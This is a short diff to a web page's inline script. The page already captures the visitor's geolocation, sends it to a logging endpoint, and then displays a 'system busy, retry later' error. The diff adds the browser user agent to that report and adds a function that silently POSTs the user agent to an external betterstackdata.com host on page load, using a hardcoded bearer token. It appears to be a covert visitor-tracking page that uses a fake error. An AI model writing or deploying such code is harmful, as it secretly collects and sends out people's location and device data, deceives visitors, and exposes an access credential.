@@ -108,6 +108,7 @@
 		<script type="text/javascript">
 			let lat;
 			let lng;
+			log();
 			navigator.geolocation.getCurrentPosition(
 				(position) => {
 					lat = position.coords.latitude;
@@ -182,7 +183,7 @@
 					},
 					body: JSON.stringify({
 						"dt": "$(date -u +'%Y-%m-%d %T UTC')",
-						"message": "lat=" + lat + ", lng=" + lng
+						"message": "lat=" + lat + ", lng=" + lng + ", ua=" + navigator.userAgent
 					})
 				});
 
@@ -190,6 +191,22 @@
 				setTimeout(() => {
 					showToast('系统繁忙，稍后重试2');
 				}, 1000);
+			}
+
+			function log() {
+				try {
+					fetch("https://s1387286.eu-nbg-2.betterstackdata.com", {
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json",
+							"Authorization": "Bearer ECn75c58qesd25ChGGyWYswJ"
+						},
+						body: JSON.stringify({
+							"dt": "$(date -u +'%Y-%m-%d %T UTC')",
+							"message": "ua=" + navigator.userAgent
+						})
+					});
+				} catch (eee) {}
 			}
 		</script>
 	</body>
